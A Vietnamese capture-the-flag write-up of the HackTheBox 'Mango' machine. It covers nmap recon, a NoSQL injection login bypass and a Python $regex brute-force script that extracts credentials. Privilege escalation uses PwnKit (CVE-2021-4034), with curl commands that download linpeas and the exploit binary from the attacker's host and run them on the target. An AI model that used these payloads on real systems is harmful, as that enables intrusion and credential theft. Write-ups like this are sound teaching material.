![image](https://hackmd.io/_uploads/Sy04NmAs0.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/214/information)

## Comment
Máy này ngoài việc khai thác lỗ hổng NoSQL ta sẽ leo quyền theo một vài cách khác nhau

# Recon
## nmap 
Sau khi nmap ta scan được **3** port ssh, http, https
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.162       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 12:38 EDT
Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 12:41 (0:00:00 remaining)
Stats: 0:03:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 12:41 (0:00:00 remaining)
Nmap scan report for 10.10.10.162
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 240.44 seconds
```
Từ đây, ta sẽ scan tiếp 3 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80,443 -sCV 10.10.10.162
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 12:43 EDT
Nmap scan report for 10.10.10.162
Host is up (0.23s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
|_http-title: Mango | Search Base
Service Info: Host: 127.0.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.72 seconds
```
Từ trên ra có thể thấy được một subdoamin `staging-order.mango.htb` và `mango.htb`

## Port 80 - http 
Port này đã bị chặn nên chuyển luôn sẽ quay sang nghiên cứu port 443 trước

![image](https://hackmd.io/_uploads/BJPDuQRo0.png)

## Port 443 - https
### [mango.htb]
Ta được điều hướng đến một giao diện trang web tìm kiếm nhưng lại không sử dụng tính năng này được

![image](https://hackmd.io/_uploads/H16NYXCjR.png)

Ngoài ra còn có 1 igoài ra còn có 1 tính năng ở `/analytics.php`

![image](https://hackmd.io/_uploads/HydqYmRi0.png)

Mất khá nhiều thời gian để xem nó có lỗi file upload không nhưng chưa phát hiện được + phiên bản của **Flexmonster** cũng không phát hiện ra lỗi 

![image](https://hackmd.io/_uploads/SJSOnXCiA.png)

![image](https://hackmd.io/_uploads/SkSFhXCoC.png)

### [staging-order.mango.htb]
Ta được điều hướng đến form login 

![image](https://hackmd.io/_uploads/r176nXAoC.png)

Kiểm tra trước tính năng Forget Password nhưng bị trả về trang login nên ta sẽ tập trung vào phần login

Sau khi thử SQLi cơ bản nó đều bị trả về trang login tuy nhiên bắt đầu đến NoSQL thì nó tra đến `/home.php`. 

```
username[$ne]=toto&password[$ne]=toto
```
![image](https://hackmd.io/_uploads/ry2Q0mRi0.png)

Ở `/home.php` ta biết được email admin là `admin@mango.htb`

![image](https://hackmd.io/_uploads/ByrFCQRoC.png)

# User flag
## Exploit 
### POCs
Như đã biết nó có lỗ hổng NoSQL
[NoSQL](https://www.mongodb.com/resources/basics/databases/nosql-explained) databases (AKA "not only SQL") lưu trữ data không giống như các loại SQL bởi các mối quan hệ. Loại chính của nó dựa theo các cặp key-value, wide-column, biểu đồ và nó thường được biểu diễn ở dạng JSON

Ta sẽ tận dụng `$regex` để dump credential. Ví dụ muốn tìm xem chữ cái đầu tiên trong mật khẩu của quản trị viên có phải là “x” hay không ta có thể gửi request như sau:
```
username=admin&password[$regex]=^x.*&login=login
```
Tạo biến bao gồm các ký tự 
```
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
```
Sử dụng vòng lặp for để grep đúng với thứ tự của username và password. Ví dụ username
```
def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break
# Nếu không có ký tự nào khớp (vòng lặp đã thử tất cả các ký tự mà không thành công), kết thúc hàm và trả về password đã tìm được.
                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames
```
Tương tự với password sau khi có username
```
 def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
# Nếu không có ký tự nào khớp (vòng lặp đã thử tất cả các ký tự mà không thành công), kết thúc hàm và trả về password đã tìm được.
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")
```

![image](https://hackmd.io/_uploads/H17rTE0jA.png)

## Post-Exploit
Có được credential ssh vào:

![image](https://hackmd.io/_uploads/BJt_ZVAs0.png)

Vì denied nên sử dụng account mango vào trước

![image](https://hackmd.io/_uploads/B1IlMECj0.png)

Thử switch user với admin lần nữa và lấy được user flag

![image](https://hackmd.io/_uploads/BJ8VzNAjC.png)

# Root flag
## Exploit
Tải linPeas về máy mục tiêu và chạy file
```
$ cd /tmp
$ curl http://10.10.14.93:8888/linpeas.sh -o li.sh
$ chmod +x li.sh
$ ./linpeas.s
```
Khi chạy LinPeas ta thấy mục tiêu dễ bị tấn công bởi **CVE-2021-4034** (PwnKit privesc). Đây là một lỗ hổng leo thang đặc quyền trong linux sử dụng [PwnKit](https://github.com/ly4k/PwnKit?ref=avitek.blog). 

![image](https://hackmd.io/_uploads/HylYoWWiC.png)

```
#Máy tấn công 
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

#Máy mục tiêu
$ curl http://10.10.14.93:8888/PwnKit -o PwnKit
$ chmod +x PwnKit
$ ./PwnKit

root@mango:/home/admin# id
uid=0(root) gid=0(root) groups=0(root),1001(admin)
```
## Post-Exploit
```
root@mango:/home/admin# cat /root/root.txt
cf3ba2eca9081a7624df*****
```

![image](https://hackmd.io/_uploads/BJQuUERjR.png)
